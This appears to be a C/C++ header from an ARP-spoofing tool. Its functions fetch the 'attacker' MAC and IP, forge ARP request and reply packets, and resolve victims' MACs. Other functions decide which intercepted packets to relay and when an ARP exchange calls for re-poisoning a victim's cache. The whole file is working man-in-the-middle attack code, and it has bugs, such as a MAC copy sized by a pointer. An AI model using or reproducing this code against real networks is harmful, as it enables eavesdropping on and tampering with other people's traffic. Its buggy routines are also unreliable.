#pragma once
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>  
#include <sys/ioctl.h>  
#include <sys/stat.h>  
#include <netinet/in.h>  
#include <net/if.h>  
#include <arpa/inet.h> 
#include "parse.h"

void print_ip(uint32_t ip){
    printf("%d.%d.%d.%d\n", (ip)&0xFF, (ip>>8)&0xFF, (ip>>16)&0xFF, (ip>>24)&0xFF);
}
void print_MAC(uint8_t *addr){
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
           addr[0],addr[1],addr[2],addr[3],
            addr[4],addr[5]);
}

void getAttackerMAC(const char * dev, uint8_t * mac){
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) perror("socket fail");
    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl fail");
    unsigned char * tmp = reinterpret_cast<unsigned char *>(ifr.ifr_hwaddr.sa_data);

    memcpy(mac,tmp,sizeof(mac));
}

uint32_t getAttackerIP(const char * dev){
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
        ipstr,sizeof(struct sockaddr));
    }
    uint32_t ip;
    ip = inet_addr(ipstr);

    return ip;
}

void make_arp_packet(uint8_t *targetM, uint8_t *srcM, int op, uint32_t senderIP, uint32_t targetIP, ARP_Packet * packet){
    memcpy(packet->eth.dst_MAC,targetM,sizeof(packet->eth.dst_MAC)); 
    memcpy(packet->eth.src_MAC,srcM,sizeof(packet->eth.src_MAC));
    packet->eth.ether_type=htons(0x0806);
    packet->arp.hw_type=htons(0x0001);
    packet->arp.p_type=htons(0x0800);
    packet->arp.hw_len=0x06;
    packet->arp.p_len=0x04;
    packet->arp.opcode=htons(op);

    memcpy(packet->arp.sender_mac, srcM, sizeof(packet->arp.sender_mac));
    if(op==1) { // ARP request, target == broadcast
        memcpy(packet->arp.target_mac, "\x00\x00\x00\x00\x00\x00", sizeof(packet->arp.target_mac));
    }
    if(op==2) { // ARP reply
        memcpy(packet->arp.target_mac, targetM, sizeof(packet->arp.target_mac));
    }
    packet->arp.sender_ip = senderIP;
    packet->arp.target_ip = targetIP;

}

void check_arp_reply(pcap_t* handle, pcap_pkthdr* header, uint32_t ip, const u_char * rep, Session * session, int s_or_t){
    ARP_Packet * arp_packet;
    while(1){ //check correct arp reply
        pcap_next_ex(handle, &header, &rep);
        arp_packet = (ARP_Packet *)rep;
        if((arp_packet->arp.sender_ip == ip) && (ntohs(arp_packet->arp.opcode) == 2)){
            if(s_or_t == 0){
                memcpy(session->sender_mac, arp_packet->arp.sender_mac, sizeof(uint8_t) * 6);
            }else if(s_or_t == 1){
                memcpy(session->target_mac, arp_packet->arp.sender_mac, sizeof(uint8_t) * 6);
            }
            break;
        }
    }
}

void find_MAC(pcap_t* handle, pcap_pkthdr *header, int session_num, const u_char * rep, uint8_t * attacker_mac, uint32_t attacker_ip, Session * session){
    unsigned char data[50];
    for(int i = 0; i < session_num; i++){
        ARP_Packet * arp_pkt = (ARP_Packet *)malloc(sizeof(ARP_Packet));
        uint8_t broadcast[6];
        memcpy(broadcast,"\xFF\xFF\xFF\xFF\xFF\xFF",6);
        memset(data, 0, sizeof(data));
        make_arp_packet(broadcast, attacker_mac, 1, attacker_ip, session[i].sender_ip, arp_pkt);
        memcpy(data, arp_pkt, sizeof(ARP_Packet));

        // send arp req to find sender mac
        if(pcap_sendpacket(handle, data ,sizeof(data))!=0){
            printf("[-] Error in find sender's MAC\n");
            exit(0);
        }printf("[+] Success to find sender's MAC\n");
        // check correct arp reply
        check_arp_reply(handle, header, session[i].sender_ip, rep, &session[i], 0);

        memset(data, 0, sizeof(data));
        make_arp_packet(broadcast, attacker_mac, 0x0001, attacker_ip, session[i].target_ip, arp_pkt);
        memcpy(data, arp_pkt, sizeof(ARP_Packet));

        // send arp req to find taregt mac
        if(pcap_sendpacket(handle, data ,sizeof(data))!=0){
            printf("[-] Error in find target's MAC\n");
            exit(0);
        }printf("[+] Success to find target's MAC\n");
        // check correct arp reply
        check_arp_reply(handle, header, session[i].target_ip, rep, &session[i], 1);
    }
}

bool check_relay(Session * sess, uint32_t attacker_ip, Packet * pkt){
    bool ret = false;
    if((memcmp(pkt->eth.src_MAC, sess->sender_mac, sizeof(uint8_t)*6) == 0) && (pkt->ip.dst_ip != attacker_ip)){
        ret = true;
    }
    return ret;
}

bool check_arp_attack(Session * sess, ARP_Packet * pkt){
    bool ret = false;
    if((pkt->arp.sender_ip == sess->target_ip) && (memcmp(pkt->arp.sender_mac, sess->target_mac, sizeof(uint8_t)*6) == 0)){
        ret = true;
    }
    if((ntohs(pkt->arp.opcode) == 1) && (memcmp(pkt->arp.sender_mac, sess->sender_mac, sizeof(uint8_t)*6) == 0)){
        ret = true;
    }
    return ret;
}
